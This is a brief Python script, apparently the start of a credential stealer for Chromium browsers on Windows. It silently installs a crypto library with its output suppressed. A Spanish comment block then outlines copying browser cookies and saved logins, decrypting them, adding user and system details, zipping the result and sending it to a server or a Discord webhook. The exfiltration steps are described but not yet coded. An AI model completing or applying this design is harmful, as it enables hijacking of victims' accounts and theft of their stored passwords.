import os, sys, subprocess
if not os.name == "nt":
	sys.exit("This script only runs on Windows.")
try:
    from Cryptodome.Cipher import AES
except ModuleNotFoundError:
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", 'pycryptodome'], stdout=subprocess.DEVNULL)
        from Cryptodome.Cipher import AES
    except:
        sys.exit()


# START - CryptoActions for Chromium --------------------------------------------------

# 1) Copiar las cookies e inicios de sesion a una carpeta temporal
# 2) Reordenar los archivos copiados
#   - ROOT
#       - Chrome
#           - Default/
#               - Cookies
#               - Login Data
#           - Profile 1/
#               - Cookies
#               - Login Data
#           - Local State
#       - structure.json
# 3) Descifrar Cookies y Login Data
# 4) Escribir en structure.json datos relevantes.
#   - UserName
#   - Working Directory
#   - Temporal Directory
#   - Time and Date
#   - WebBrowser
#       - Name
#       - Install Directory
#       - User Data Directory
# 5) Comprimir ROOT
# 6) Enviar ZIP de ROOT al servidor
# 6.5) OPCIONAL: WebHook Discord.

# END - CryptoActions for Chromium --------------------------------------------------


